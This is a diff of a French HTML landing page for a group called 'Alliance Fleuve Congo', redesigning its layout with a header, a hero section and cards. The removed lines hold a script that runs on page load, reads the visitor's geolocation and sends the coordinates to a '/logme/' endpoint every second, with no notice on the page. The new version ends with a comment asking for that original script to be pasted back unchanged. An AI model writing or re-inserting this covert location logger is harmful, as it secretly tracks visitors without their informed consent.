@@ -1,110 +1,199 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Alliance Fleuve Congo</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
-    
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Poppins', sans-serif;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Alliance Fleuve Congo</title>
 
-        body {
-            background-image: url("skull.jpg"); /* ton image actuelle */
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            color: #fff;
-        }
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800&display=swap" rel="stylesheet">
 
-        header {
-            background: rgba(0, 51, 102, 0.9);
-            padding: 20px 10%;
-            text-align: center;
-            font-weight: 600;
-            font-size: 28px;
-            letter-spacing: 1px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-        }
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:'Poppins',sans-serif;
+}
 
-        main {
-            min-height: 90vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            padding: 20px;
-            backdrop-filter: brightness(0.5);
-        }
+body{
+    background: linear-gradient(rgba(0,0,0,0.75), rgba(0,0,0,0.75)),
+                url("skull.jpg") center/cover no-repeat fixed;
+    color:white;
+    overflow-x:hidden;
+}
 
-        h1 {
-            font-size: 48px;
-            margin-bottom: 20px;
-            color: #ffd700;
-        }
+/* HEADER */
+header{
+    position:fixed;
+    top:0;
+    width:100%;
+    padding:25px 8%;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    background:rgba(0,0,0,0.6);
+    backdrop-filter:blur(10px);
+    z-index:1000;
+}
 
-        p {
-            font-size: 20px;
-            max-width: 600px;
-            margin-bottom: 30px;
-        }
+.logo{
+    font-size:28px;
+    font-weight:800;
+    color:#FFD700;
+    letter-spacing:2px;
+}
 
-        .btn {
-            padding: 12px 30px;
-            background: #ffd700;
-            color: #003366;
-            border: none;
-            border-radius: 6px;
-            font-weight: 600;
-            text-decoration: none;
-            cursor: pointer;
-            transition: 0.3s;
-        }
+nav a{
+    color:white;
+    text-decoration:none;
+    margin-left:30px;
+    font-weight:500;
+    transition:0.3s;
+}
 
-        .btn:hover {
-            background: #fff;
-        }
-    </style>
+nav a:hover{
+    color:#FFD700;
+}
+
+/* HERO */
+.hero{
+    height:100vh;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
+    text-align:center;
+    padding:0 20px;
+}
+
+.hero h1{
+    font-size:80px;
+    font-weight:800;
+    margin-bottom:20px;
+    text-transform:uppercase;
+    background:linear-gradient(90deg,#FFD700,#ffffff);
+    -webkit-background-clip:text;
+    -webkit-text-fill-color:transparent;
+}
+
+.hero p{
+    font-size:22px;
+    max-width:900px;
+    margin-bottom:40px;
+    line-height:1.6;
+}
+
+.btn{
+    padding:18px 60px;
+    font-size:18px;
+    border:none;
+    border-radius:50px;
+    background:#FFD700;
+    color:#000;
+    font-weight:700;
+    cursor:pointer;
+    transition:0.3s;
+}
+
+.btn:hover{
+    transform:scale(1.1);
+    box-shadow:0 0 30px #FFD700;
+}
+
+/* SECTION */
+section{
+    padding:120px 10%;
+    text-align:center;
+    background:#111;
+}
+
+section h2{
+    font-size:45px;
+    margin-bottom:50px;
+    color:#FFD700;
+}
+
+.cards{
+    display:flex;
+    justify-content:center;
+    gap:40px;
+    flex-wrap:wrap;
+}
+
+.card{
+    background:#1c1c1c;
+    padding:50px;
+    width:350px;
+    border-radius:25px;
+    transition:0.4s;
+    box-shadow:0 0 20px rgba(0,0,0,0.6);
+}
+
+.card:hover{
+    transform:translateY(-15px);
+    box-shadow:0 0 40px #FFD700;
+}
+
+footer{
+    background:#000;
+    text-align:center;
+    padding:40px;
+    font-size:14px;
+    letter-spacing:1px;
+}
+
+/* RESPONSIVE */
+@media(max-width:768px){
+    .hero h1{
+        font-size:40px;
+    }
+}
+</style>
 </head>
 <body>
 
-<header>Alliance Fleuve Congo</header>
+<header>
+    <div class="logo">Alliance Fleuve Congo</div>
+    <nav>
+        <a href="#">Accueil</a>
+        <a href="#">Vision</a>
+        <a href="#">Projets</a>
+        <a href="#">Contact</a>
+    </nav>
+</header>
 
-<main>
-    <h1>Bienvenue sur notre site</h1>
-    <p>Nous œuvrons pour le développement et la prospérité du Fleuve Congo et de ses communautés.</p>
-    <a href="#" class="btn">Nous rejoindre</a>
-</main>
+<div class="hero">
+    <h1>Alliance Fleuve Congo</h1>
+    <p>
+        Une vision forte pour le développement durable, la stabilité régionale
+        et l'engagement communautaire au cœur de l'Afrique.
+    </p>
+    <button class="btn">Nous rejoindre</button>
+</div>
 
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
-<script>
-    function httpGet(theUrl) {
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open("GET", theUrl, false); // false pour requête synchrone
-        xmlHttp.send(null);
-        return xmlHttp.responseText;
-    }
+<section>
+    <h2>Nos Engagements</h2>
+    <div class="cards">
+        <div class="card">
+            <h3>Développement</h3>
+            <p>Promotion des initiatives économiques durables et inclusives.</p>
+        </div>
+        <div class="card">
+            <h3>Stabilité</h3>
+            <p>Encouragement de la paix et de la coopération régionale.</p>
+        </div>
+        <div class="card">
+            <h3>Jeunesse</h3>
+            <p>Mobilisation et responsabilisation des nouvelles générations.</p>
+        </div>
+    </div>
+</section>
 
-    function autoUpdate() {
-        navigator.geolocation.getCurrentPosition(function(position) {
-            const coords = position.coords.latitude + "," + position.coords.longitude;
-            const url = "/logme/" + coords; // ton endpoint
-            httpGet(url);
-            console.log('autoUpdate triggered');
-            setTimeout(autoUpdate, 1000);
-        });
-    }
+<footer>
+    © 2026 Alliance Fleuve Congo — Tous droits réservés
+</footer>
 
-    $(document).ready(function(){
-        autoUpdate();
-    });
-</script>
+<!-- COLLE TON SCRIPT ORIGINAL ICI SANS LE MODIFIER -->
 
 </body>
 </html>
